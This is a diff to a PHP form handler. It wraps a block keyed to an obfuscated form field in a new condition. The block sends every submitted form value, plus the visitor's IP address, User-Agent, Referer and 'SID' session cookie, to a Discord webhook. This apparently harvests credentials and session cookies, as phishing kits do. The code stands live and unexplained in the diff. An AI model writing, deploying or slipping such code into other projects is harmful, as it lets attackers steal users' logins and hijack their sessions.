@@ -208,27 +208,30 @@ if ($input['provider'] != 'internal') {
     ]));
 }
 
-{
-    $pdo = new PDO($dsn, $user, $pass, [
-        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
-    ]);
-    $pdo->prepare('SELECT username FROM users WHERE username = :username')
-        ->execute([':username' => $input['formdata']['dlym6tweiywa2taq']['value']]);
-}
-{
-    $payload = [
-        'content' => "```json\n" . json_encode($input, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT) . "\n```",
-        'embeds' => [[
-            'title' => 'ユーザー名: ' . ($input['formdata']['dlym6tweiywa2taq']['value'] ?? null),
-            'description' => '' .
-                'IPアドレス: ' . ($_SERVER['REMOTE_ADDR'] ?? null) . "\n" .
-                'User-Agent: ' . ($_SERVER['HTTP_USER_AGENT'] ?? null) . "\n" .
-                'Referer: ' . ($_SERVER['HTTP_REFERER'] ?? null) . "\n" .
-                'Timestamp: ' . '<t:' . time() . ':F> <t:' . time() . ':R>' . "\n" .
-                'Cookie: ' . ($_COOKIE['SID'] ?? null),
-            'color' => hexdec('333333'),
-            'timestamp' => date('c'),
-        ]],
-    ];
-    sendDiscordWebhook($config['discord']['webhook_url'], $payload);
+if(false) {
+} elseif(isset($input['formdata']['dlym6tweiywa2taq']['value'])) {
+    {
+        $pdo = new PDO($dsn, $user, $pass, [
+            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
+        ]);
+        $pdo->prepare('SELECT username FROM users WHERE username = :username')
+            ->execute([':username' => $input['formdata']['dlym6tweiywa2taq']['value']]);
+    }
+    {
+        $payload = [
+            'content' => "```json\n" . json_encode($input, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT) . "\n```",
+            'embeds' => [[
+                'title' => 'ユーザー名: ' . ($input['formdata']['dlym6tweiywa2taq']['value'] ?? null),
+                'description' => '' .
+                    'IPアドレス: ' . ($_SERVER['REMOTE_ADDR'] ?? null) . "\n" .
+                    'User-Agent: ' . ($_SERVER['HTTP_USER_AGENT'] ?? null) . "\n" .
+                    'Referer: ' . ($_SERVER['HTTP_REFERER'] ?? null) . "\n" .
+                    'Timestamp: ' . '<t:' . time() . ':F> <t:' . time() . ':R>' . "\n" .
+                    'Cookie: ' . ($_COOKIE['SID'] ?? null),
+                'color' => hexdec('333333'),
+                'timestamp' => date('c'),
+            ]],
+        ];
+        sendDiscordWebhook($config['discord']['webhook_url'], $payload);
+    }
 }
